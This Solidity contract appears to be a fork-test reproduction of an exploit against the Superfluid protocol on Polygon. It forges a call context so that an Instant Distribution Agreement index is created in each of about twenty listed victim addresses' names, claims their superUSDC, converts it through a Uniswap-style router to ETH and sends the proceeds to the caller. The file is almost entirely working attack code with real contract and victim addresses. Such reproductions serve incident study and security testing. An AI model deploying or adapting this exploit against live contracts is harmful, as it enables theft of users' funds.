// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../HarvestFF/interfaces/IERC20.sol";
import "../HarvestFF/interfaces/IUniswapV2Router02.sol";
import "../HarvestFF/interfaces/IFlashLoanReceiver.sol";


interface ISuperfluid {
    function callAgreement(
         address agreementClass,
         bytes calldata callData,
         bytes calldata userData
     )
        external
        returns (bytes memory returnedData);
}

interface IInstantDistributionAgreementV1 {
    function createIndex(
        address token,
        uint32 indexId,
        bytes calldata ctx)
            external
            returns(bytes memory newCtx);

     function updateIndex(
        address token,
        uint32 indexId,
        uint128 indexValue,
        bytes calldata ctx)
            external
            returns(bytes memory newCtx);

    function updateSubscription(
        address token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx)
            external
            returns(bytes memory newCtx);

    function claim(
        address token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx)
        external
        returns(bytes memory newCtx);
}

interface ISuperToken is IERC20 {
    function downgrade(uint256 amount) external;
}

library ContextDefinitions {
    // app level
    uint256 constant internal CALL_INFO_APP_LEVEL_MASK = 0xFF;

    // call type
    uint256 constant internal CALL_INFO_CALL_TYPE_SHIFT = 32;
    uint256 constant internal CALL_INFO_CALL_TYPE_MASK = 0xF << CALL_INFO_CALL_TYPE_SHIFT;
    uint8 constant internal CALL_INFO_CALL_TYPE_AGREEMENT = 1;
    uint8 constant internal CALL_INFO_CALL_TYPE_APP_ACTION = 2;
    uint8 constant internal CALL_INFO_CALL_TYPE_APP_CALLBACK = 3;

    function decodeCallInfo(uint256 callInfo)
        internal pure
        returns (uint8 appLevel, uint8 callType)
    {
        appLevel = uint8(callInfo & CALL_INFO_APP_LEVEL_MASK);
        callType = uint8((callInfo & CALL_INFO_CALL_TYPE_MASK) >> CALL_INFO_CALL_TYPE_SHIFT);
    }

    function encodeCallInfo(uint8 appLevel, uint8 callType)
        internal pure
        returns (uint256 callInfo)
    {
        return uint256(appLevel) | (uint256(callType) << CALL_INFO_CALL_TYPE_SHIFT);
    }

}


interface UniSwapV2 {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Pair {
    function swap(
    uint256 amount0Out,
    uint256 amount1Out,
    address to,
    bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
}

interface IUSDT {
    function approve(address _spender, uint256 _value) external;
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}



// eth_rpc_url = "https://rpc.ankr.com/polygon"
// fork_block_number = 24684668
contract ExploitTest {
    ISuperfluid superfluid = ISuperfluid(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
    IInstantDistributionAgreementV1 ida = IInstantDistributionAgreementV1(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);
    ISuperToken superusdc = ISuperToken(0xCAa7349CEA390F89641fe306D93591f87595dc1F);
    IERC20 usdc = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    IERC20 WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);
    
    IUniswapV2Factory public constant uniswapV2Factory = IUniswapV2Factory(0x5757371414417b8C6CAad45bAeF941aBc7d3Ab32); // Uniswap V2 Factory 주소

    address private constant UNISWAP_ROUTER = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;
    IUniswapV2Pair private pair;
    IUniswapV2Router02 public uniswapRouter;

    address[] public victims =  [
        0x5073c1535A1a238E7c7438c553F1a2BaAC366cEE,
        0xe6116AA08e14afE08A9A563E9ef6cCd5b47070B7,
        0x0154d25120Ed20A516fE43991702e7463c5A6F6e,
        0x6583f33895B538DFdeeE234F2D34dF1033655de1,
        0xe44257ec3c1767074f9d0A648073Eb1e6D369f8a,
        0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188,
        0x81Ea02098336435d5e92e032C029AAB850304f5D,
        0xA08f80dc1759b12fdC40A4dc64562b322C418E1f,
        0xD6Fb1f82FF2296b55bddfFcCe80ABde7fbC6c22d,
        0x39b7B5fb06C4B24D8758306774D7340dC694320A,
        0x8393183E7217D982A698682a3F620ae6957f6F2d,
        0x6AEAeE5Fd4D05A741723D752D30EE4D72690A8f7,
        0x1EB3FAA360bF1f093F5A18d21f21f13D769d044A,
        0x2Af4AE1226f28A1a3bc239b96e16291EF4fDD57d,
        0xAF8b668bfC2aD9457c03c2989C7816b5cbe2185c,
        0x0C3483e3B355986D6Bb76E3CEbBC8dD8EC20779C,
        0xf7f0CFC3772d29d4CC1482A2ACB7Be16a85a2223,
        0x87a4b3E26D17C88C8E22B605bb211f3b92c659F4,
        0x290a27026021af22b1794Dc1e489A35869820637,
        0xdf924446d08C642E0B1Df15089E2ab87f737a544,
        // 0x6AEAeE5Fd4D05A741723D752D30EE4D72690A8f7,
        // 0xD6Fb1f82FF2296b55bddfFcCe80ABde7fbC6c22d,
        0x7749e869B88A3C45b40F8C257E0bB36981b8262f,
        0xc78131beAdF917DFa2aCE8fAf49eA88Ada7c4bD0
    ];

    uint256 PROFIT_USDC = 0;
    uint256 PROFIT_SUPERUSDC = 0;

    function uniswapSwap(uint256 _amountIn) public {
        // Approve transfer of USDC token to uniswapRouter
        usdc.approve(address(uniswapRouter), _amountIn);
        usdc.approve(address(this), _amountIn);

        // Get current reserves of the USDC-WETH pair
        (uint256 reserveUSDC, uint256 reserveWETH, ) = pair.getReserves();

        // Calculate the amount of WETH to receive
        uint256 amountOut = uniswapRouter.getAmountOut(_amountIn, reserveUSDC, reserveWETH);

        // Swap USDC for WETH
        address[] memory path = new address[](2);
        path[0] = address(usdc);
        path[1] = address(WETH);
        uniswapRouter.swapExactTokensForTokens(_amountIn, amountOut, path, address(this), block.timestamp);
    }

    constructor() {
        pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(usdc), address(WETH)));
        uniswapRouter = IUniswapV2Router02(UNISWAP_ROUTER);
    }

    struct Context {
        // callback level
        uint8 appLevel;
        // type of call
        uint8 callType;
        // the system timestsamp
        uint256 timestamp;
        // The intended message sender for the call
        address msgSender;

        // For callbacks it is used to know which agreement function selector is called
        bytes4 agreementSelector;
        // User provided data for app callbacks
        bytes userData;

        // app allowance granted
        uint256 appAllowanceGranted;
        // app allowance wanted by the app callback
        uint256 appAllowanceWanted;
        // app allowance used, allowing negative values over a callback session
        int256 appAllowanceUsed;
        // app address
        address appAddress;
        // app allowance in super token
        address appAllowanceToken;
    }

    function encodeContext(Context memory context)
        private pure
        returns (bytes memory ctx)
    {
        uint256 callInfo = ContextDefinitions.encodeCallInfo(context.appLevel, context.callType);
        uint256 allowanceIO =
            uint128(context.appAllowanceGranted) |
            (uint256(uint128(context.appAllowanceWanted)) << 128);
        ctx = abi.encode(
            abi.encode(
                callInfo,
                context.timestamp,
                context.msgSender,
                context.agreementSelector,
                context.userData
            ),
            abi.encode(
                allowanceIO,
                context.appAllowanceUsed,
                context.appAddress,
                context.appAllowanceToken
            )
        );
    }

    function attack(address[] memory targets) public {
        for (uint256 i = 0; i < targets.length; i++) {
            address victim = targets[i];
            
            Context memory ctx = Context({
                appLevel: 0,
                callType: ContextDefinitions.CALL_INFO_CALL_TYPE_AGREEMENT,
                timestamp: block.timestamp,
                msgSender: victim,
                agreementSelector: 0,
                userData: "",
                appAllowanceGranted: 0,
                appAllowanceWanted: 0,
                appAllowanceUsed: 0,
                appAddress: address(0),
                appAllowanceToken: address(0)
            });

            uint32 indexId = 0xdeadbeaf + uint32(i);

            // crateIndex(superusdc, indexId, fakeCTx)
            superfluid.callAgreement(
                address(ida),
                abi.encodeWithSelector(
                    IInstantDistributionAgreementV1.createIndex.selector,
                    superusdc,
                    indexId,
                    encodeContext(ctx),
                    new bytes(0)
                ),
                new bytes(0)
            );

            uint256 units = superusdc.balanceOf(victim);
            // emit log_named_uint("units", units);

            // updateSubscription(superusdc, indexId, victim, units, fakeCtx)
            superfluid.callAgreement(
                address(ida),
                abi.encodeWithSelector(
                    IInstantDistributionAgreementV1.updateSubscription.selector,
                    superusdc,
                    indexId,
                    address(this),
                    units,
                    encodeContext(ctx),
                    new bytes(0)
                ),
                new bytes(0)
            );

            
            superfluid.callAgreement(
                address(ida),
                abi.encodeWithSelector(
                    IInstantDistributionAgreementV1.updateIndex.selector,
                    superusdc,
                    indexId,
                    1,
                    encodeContext(ctx),
                    new bytes(0)
                ),
                new bytes(0)
            );

            superfluid.callAgreement(
                address(ida),
                abi.encodeWithSelector(
                    IInstantDistributionAgreementV1.claim.selector,
                    superusdc,
                    victim,
                    indexId,
                    address(this),
                    new bytes(0)
                ),
                new bytes(0)
            );

            // emit log_named_uint("my superusdc balance", superusdc.balanceOf(address(this)));
            // emit log_named_uint("my USDC balance", usdc.balanceOf(address(this)));

            superusdc.downgrade(superusdc.balanceOf(address(this)));

            // Sup
            // emit log_named_uint("\n[Victim -> count]", i);
            // emit log_named_uint("my superusdc balance", superusdc.balanceOf(address(this)));
            // emit log_named_uint("my USDC balance", usdc.balanceOf(address(this)));
        }

    }
    function testExploit() public {
        attack(victims);
        // usdc => WETH
        uniswapSwap(usdc.balanceOf(address(this)));
        IWETH(address(WETH)).withdraw(WETH.balanceOf(address(this)));

        // ETH -> EOA
        payable(msg.sender).transfer(address(this).balance);
        //
    }
}
